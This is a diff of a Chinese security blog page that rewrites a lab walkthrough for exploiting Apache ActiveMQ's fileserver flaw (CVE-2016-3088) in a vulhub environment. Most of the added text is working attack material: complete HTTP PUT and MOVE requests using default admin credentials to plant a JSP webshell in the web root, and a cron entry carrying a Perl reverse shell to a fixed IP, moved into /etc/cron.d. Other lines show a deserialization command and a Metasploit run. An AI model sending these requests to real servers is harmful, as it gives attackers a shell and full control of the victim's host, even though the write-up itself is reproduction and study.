@@ -19,9 +19,15 @@
 <meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609114603532.png">
 <meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609144843836.png">
 <meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609145216094.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609173254630.png">
+<meta property="og:image" content="c:%5CUsers%5Cbiubiubiu%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201018003626077.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20201016141559896.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20201020104812776.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20201020160042538.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20201020161250982.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20201023103644292.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20201023103840831.png">
 <meta property="article:published_time" content="2020-06-09T02:43:16.000Z">
-<meta property="article:modified_time" content="2020-06-23T02:39:21.391Z">
+<meta property="article:modified_time" content="2020-10-23T02:39:05.625Z">
 <meta property="article:author" content="腾小飞的博客">
 <meta property="article:tag" content="exp">
 <meta property="article:tag" content="ActiveMQ">
@@ -216,21 +222,52 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;编码后的反弹命令&quot; -Yp ROME 目标IP 61616</span><br></pre></td></tr></table></figure>
 
 <p>在vps上监听对应端口，触发条件和前面一样需要登录后点击队列中的消息</p>
-<h3 id="PUT任意文件写入（CVE-2016-3088）"><a href="#PUT任意文件写入（CVE-2016-3088）" class="headerlink" title="PUT任意文件写入（CVE-2016-3088）"></a>PUT任意文件写入（CVE-2016-3088）</h3><h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p>影响版本：Apache ActiveMQ 5.x ~ 5.14.0</p>
-<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>想要利用这个漏洞getshell，有如下几个条件</p>
-<p>a.知道绝对路径（这里没复现成功，payload如下，PUT一个不存在的路径即返回绝对路径）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;a..&#x2F;..&#x2F;%08&#x2F;..%08&#x2F;.%08&#x2F;%08 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.197.25:8161</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure>
+<h3 id="PUT任意文件写入（CVE-2016-3088）更新时间2020-10-20"><a href="#PUT任意文件写入（CVE-2016-3088）更新时间2020-10-20" class="headerlink" title="PUT任意文件写入（CVE-2016-3088）更新时间2020/10/20"></a>PUT任意文件写入（CVE-2016-3088）更新时间2020/10/20</h3><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>影响版本：Apache ActiveMQ 5.x ~ 5.14.0</p>
+<p>​                   ActiveMQ在5.12.x~5.13.x默认关闭fileserver应用</p>
+<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>vulhub拉取漏洞环境，使用以下命令编译启动，具体参考<a href="https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md" target="_blank" rel="noopener">这里</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
-<p>b.可以成功PUT文件</p>
-<p>c.可以成功MOVE文件</p>
-<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;shell.jsp HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.197.25:8161</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Content-Length: 26</span><br><span class="line"></span><br><span class="line">this is jsp webshell code.</span><br></pre></td></tr></table></figure>
+<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><ol>
+<li>写入webshell</li>
+<li>写入cron或ssh key等文件</li>
+<li>写入jar或jetty.xml等库和配置文件</li>
+</ol>
+<h4 id="webshell利用"><a href="#webshell利用" class="headerlink" title="webshell利用"></a>webshell利用</h4><h5 id="利用条件：1、成功登录ActiveMQ-2、知道绝对路径"><a href="#利用条件：1、成功登录ActiveMQ-2、知道绝对路径" class="headerlink" title="利用条件：1、成功登录ActiveMQ    2、知道绝对路径"></a>利用条件：1、成功登录ActiveMQ    2、知道绝对路径</h5><p>成功登录后，访问如下URL可查看绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxxx&#x2F;admin&#x2F;test&#x2F;systemProperties.jsp</span><br></pre></td></tr></table></figure>
 
-<p>PUT最好写个小马，因为直接PUT大马会存在编码等问题，PUT进去后并不能直接解析，访问如下</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609173254630.png" alt="githubimage-20200609173254630"></p>
-<p>需要把木马挪到可以解析的目录，如admin目录api目录，payload如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;uu.jsp HTTP&#x2F;1.1</span><br><span class="line">Destination:file:&#x2F;opt&#x2F;apache-activemq-5.11.1&#x2F;webapps&#x2F;api&#x2F;uu.jsp</span><br><span class="line">Host: 192.168.197.25:8161</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+<p><img src="C:%5CUsers%5Cbiubiubiu%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201018003626077.png" alt="image-20201018003626077"></p>
+<p>也可以用如下数据包尝试爆绝对路径（复现未成功）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;test&#x2F;%20&#x2F;%20 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.125.130:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">jspspay</span><br></pre></td></tr></table></figure>
 
-<p>再利用小马传大马即可</p>
+<p>发送如下数据包上传webshell，这里传jspx的大马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line"></span><br><span class="line">jspspay</span><br></pre></td></tr></table></figure>
+
+<p>返回204上传成功</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20201016141559896.png" alt="image-20201016141559896"></p>
+<p>移动到web目录下的api文件夹（<code>/opt/activemq/webapps/api/s.jsp</code>）中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;s.jsp</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20201020104812776.png" alt="image-20201020104812776"></p>
+<p>最终访问如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxxxxxxx:8161&#x2F;api&#x2F;s.jsp</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="计划任务反弹"><a href="#计划任务反弹" class="headerlink" title="计划任务反弹"></a>计划任务反弹</h4><p>写入反弹计划命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 172.100.30.198:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 250</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;172.100.30.198&quot;;$p&#x3D;8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>这里在命令后面注意把换行符修改为0a，也就是linux中的\n</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20201020160042538.png" alt=""></p>
+<p>移动到/etc/cron.d/目录下，遇到ubuntu目录不太一样，参考<a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">这里</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;etc&#x2F;cron.d&#x2F;root</span><br><span class="line">Host: 172.100.30.198:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+
+<p>成功或接收shell</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20201020161250982.png" alt="image-20201020161250982"></p>
+<h4 id="写入ssh密钥"><a href="#写入ssh密钥" class="headerlink" title="写入ssh密钥"></a>写入ssh密钥</h4><p>因docker未安装ssh未复现，可参考<a href="https://www.secpulse.com/archives/60064.html" target="_blank" rel="noopener">这里</a></p>
+<h4 id="metasploit反弹shell"><a href="#metasploit反弹shell" class="headerlink" title="metasploit反弹shell"></a>metasploit反弹shell</h4><p>进入metasploit，搜索2016-3088</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20201023103644292.png" alt="image-20201023103644292"></p>
+<p>设置好IP，干就完了</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20201023103840831.png" alt="image-20201023103840831"></p>
 
       
 
@@ -519,15 +556,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ActiveMQ</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CVE-2018-8715</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">APPWeb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">shiro反序列</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ActiveMQ</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -543,15 +584,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">shiro反序列</a>
+                <a href="javascript:void(0)" class="js-tag color3">OllyDbg</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞修复</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">OllyDbg</a>
               </li>
             
             <div class="clearfix"></div>
